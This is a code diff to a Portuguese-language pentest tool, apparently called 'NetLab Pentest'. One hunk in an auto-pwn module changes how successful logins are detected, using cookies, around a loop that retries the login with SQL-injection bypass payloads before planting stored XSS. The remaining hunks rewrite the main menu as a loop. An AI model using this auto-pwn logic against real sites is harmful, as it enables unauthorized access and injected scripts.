@@ -1965,7 +2277,8 @@ class ModuloAutoPwn(BaseAtaque):
                 timeout=5, allow_redirects=False, headers=_headers_extras(),
             )
             if not _login_bem_sucedido(r_l.status_code, r_l.text,
-                                        r_l.headers.get("Location", "")):
+                                        r_l.headers.get("Location", ""),
+                                        r_l.headers.get("Set-Cookie", "")):
                 # Tenta com bypass
                 for payload in _SQLI_BYPASS[:2]:
                     r_l = sess.post(
@@ -1974,7 +2287,8 @@ class ModuloAutoPwn(BaseAtaque):
                         timeout=5, allow_redirects=False, headers=_headers_extras(),
                     )
                     if _login_bem_sucedido(r_l.status_code, r_l.text,
-                                           r_l.headers.get("Location", "")):
+                                           r_l.headers.get("Location", ""),
+                                           r_l.headers.get("Set-Cookie", "")):
                         break
                 else:
                     erro("Não foi possível autenticar para XSS armazenado.")
@@ -2048,44 +2362,43 @@ def _checar_deps() -> None:
 # ══════════════════════════════════════════════════════════════════════════════
 
 def menu_principal() -> None:
-    limpar_tela()
-    banner()
-    _checar_deps()
+    while True:
+        limpar_tela()
+        banner()
+        _checar_deps()
 
-    if _RICH_OK and console:
-        console.print("[bold cyan]  Selecione o módulo:[/bold cyan]")
-        for chave, (nome, _) in _MODULOS.items():
-            console.print(f"    [bold]{chave:>2}[/bold] — {nome}")
-        console.print("     [bold]0[/bold] — Sair\n")
-    else:
-        print(f"  {_CIANO}Selecione o módulo:{_RESET}")
-        for chave, (nome, _) in _MODULOS.items():
-            print(f"    {chave:>2} — {nome}")
-        print(f"     0 — Sair\n")
+        if _RICH_OK and console:
+            console.print("[bold cyan]  Selecione o módulo:[/bold cyan]")
+            for chave, (nome, _) in _MODULOS.items():
+                console.print(f"    [bold]{chave:>2}[/bold] — {nome}")
+            console.print("     [bold]0[/bold] — Sair\n")
+        else:
+            print(f"  {_CIANO}Selecione o módulo:{_RESET}")
+            for chave, (nome, _) in _MODULOS.items():
+                print(f"    {chave:>2} — {nome}")
+            print(f"     0 — Sair\n")
 
-    opcao = input(f"  {_CIANO}Módulo:{_RESET} ").strip()
+        opcao = input(f"  {_CIANO}Módulo:{_RESET} ").strip()
 
-    if opcao == "0":
-        info("Encerrando NetLab Pentest.")
-        sys.exit(0)
+        if opcao == "0":
+            info("Encerrando NetLab Pentest.")
+            sys.exit(0)
 
-    if opcao not in _MODULOS:
-        erro(f"Opção inválida: {opcao!r}")
-        time.sleep(1)
-        menu_principal()
-        return
+        if opcao not in _MODULOS:
+            erro(f"Opção inválida: {opcao!r}")
+            time.sleep(1)
+            continue
 
-    nome_mod, ClasseMod = _MODULOS[opcao]
-    print(f"\n  {_BOLD}▶  {nome_mod}{_RESET}")
+        nome_mod, ClasseMod = _MODULOS[opcao]
+        print(f"\n  {_BOLD}▶  {nome_mod}{_RESET}")
 
-    try:
-        mod = ClasseMod()
-        mod.executar_interativo()
-    except KeyboardInterrupt:
-        aviso("\n  Interrompido.")
+        try:
+            mod = ClasseMod()
+            mod.executar_interativo()
+        except KeyboardInterrupt:
+            aviso("\n  Interrompido.")
 
-    input(f"\n  {_CIANO}Pressione Enter para voltar ao menu...{_RESET}")
-    menu_principal()
+        input(f"\n  {_CIANO}Pressione Enter para voltar ao menu...{_RESET}")
 
 
 # ══════════════════════════════════════════════════════════════════════════════
